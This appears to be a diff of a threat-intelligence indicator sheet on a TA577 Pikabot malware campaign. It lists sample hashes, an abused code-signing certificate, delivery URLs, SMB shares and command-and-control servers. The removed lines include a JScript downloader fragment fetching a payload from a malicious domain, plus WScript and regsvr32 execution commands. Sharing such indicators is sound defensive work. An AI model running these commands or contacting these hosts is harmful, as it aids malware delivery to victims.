@@ -1,75 +1,66 @@
-15.02.2024 | Pikabot | TA577 | 1.8.32-beta
+20.02.2024 | Pikabot | TA577 | 1.8.32-beta
 
 *************************************************
 
-.xls 3887c3739d6413c1d0b3fb9f17e88a2456671272687a42ae35dfa710cd2a9ab4
-.js 49d8fb17458ca0e9eaff8e3b9f059a9f9cf474cc89190ba42ff4f1e683e09b72
-.js bf6df7058875f9bb932ddb5c1af31e9a314cde21ede07c3b5440618d20b8fd59
-.dll 0e7e4c73f9dc862561075370caebc2755a2e31ce127b9210d16628d777b854b9
-.dll f34cdd84aef315a325e36708b3da0c5c15029cdcf1e503e5b4d1f5aedf49b125
+.zip ed0f7e2df341cfad8f80459128810997464ce478b579432f227aa466a485363a
+.exe 3a993c44e39c426239051b00aa692b7e7d1b6092a2087af04b3f3bc3a3c79208
 
 *************************************************
 
-Organisation:  ARCHIKADIA SP Z O O
-Issuer:  SSL.com EV Code Signing Intermediate CA RSA R3
-Algorithm:  sha256WithRSAEncryption
-Valid from: 2024-01-15T15:05:25Z
-Valid to:   2025-01-14T15:05:25Z
-Serial number:  08bfa0eca008014a726359aee87c1828
-Thumbprint Algorithm:   SHA256
-Thumbprint:  efe61720c07d356b8da58b0c1ad5addfd60b870bbd0a57f8804708bb54f4576c
-Source:  This information was brought to you by ReversingLabs A1000 Malware Analysis Platform
+Code Signing Certificate
+Organisation:	4leaf Holding Corp.
+Issuer:	SSL.com EV Code Signing Intermediate CA RSA R3
+Algorithm:	sha256WithRSAEncryption
+Valid from:	2024-01-26T19:53:50Z
+Valid to:	2025-01-25T19:53:50Z
+Serial number:	 5e90650175692086f73dd05ee14b3da5
+Intelligence:	 11 malware samples on MalwareBazaar are signed with this code signing certificate
+Thumbprint Algorithm:	SHA256
+Thumbprint:	 1dda515eb6c730f5169301c95163d9b30c1b26d46765930b2d3e9fd9b51e02bb
 
 *************************************************
 
-zip > .jar > .dll
+url > zip > smb > .exe
 
-OFFICIISWO.xlsx
-
-WScript.exe \\85.195.115.20\share\reports_02.15.2024_1.js
-
-var dL = new ActiveXObject("msxml2.xmlhttp"), DO = new ActiveXObject("adodb.stream");
-dL.open("GET", "https://globalpanelinc.com/wnx/fGb", false);
-
-regsvr32.exe nh.jpg
+AEDT.exe
 
 ctfmon.exe -p 1234
 
 *************************************************
 
-js distro
+SMB Shares e.g file://allterra24.com/public/
 
-\\85.195.115.20\share\reports_02.15.2024_1.js
-\\85.195.115.20\share\reports_02.15.2024_2.js
-
-.dll distro
-
-https://realponti.com/wfE/SdQ
-https://globalpanelinc.com/wnx/fGb
+allterra24.com/public/
+funredblog.com/public/
+introwebllc.com/public/
+newssocialwork.com/public/
+powerglobalstore.com/public/
+realsleeper.com/public/
+vendercompany.com/public/
+yournutrientsolutions.com/public/
 
 *************************************************
 
 c2's
 
-45.76.251.190:5631
-131.153.231.178:2221
-95.179.135.3:2225
-155.138.147.62:2223
-86.38.225.109:13724
-172.232.189.219:2224
-198.44.187.12:2224
-104.156.233.235:2226
-103.82.243.5:13785
-86.38.225.106:2221
-45.32.248.100:2226
-23.226.138.161:5242
-37.60.242.85:9785
-104.129.55.105:2223
-45.32.21.184:5242
-178.18.246.136:2078
-108.61.78.17:13783
-86.38.225.105:13721
-172.232.189.10:1194
-172.232.162.97:13783
+https://89.117.23.34:5938
+https://37.60.242.85:9785
+https://86.38.225.106:2221
+https://89.117.23.185:2221
+https://57.128.165.176:13721
+https://141.95.106.106:2967
+https://178.18.246.136:2078
+https://154.12.248.41:5000
+https://145.239.135.24:5243
+https://103.82.243.5:13785
+https://23.226.138.161:5242
+https://89.117.23.186:5632
+https://23.226.138.143:2083
+https://148.113.141.220:2224
+https://154.38.175.241:13721
+https://109.199.99.131:13721
+https://154.12.233.66:2224
+https://104.129.55.105:2223
+https://23.226.138.161:5242
 
 *************************************************
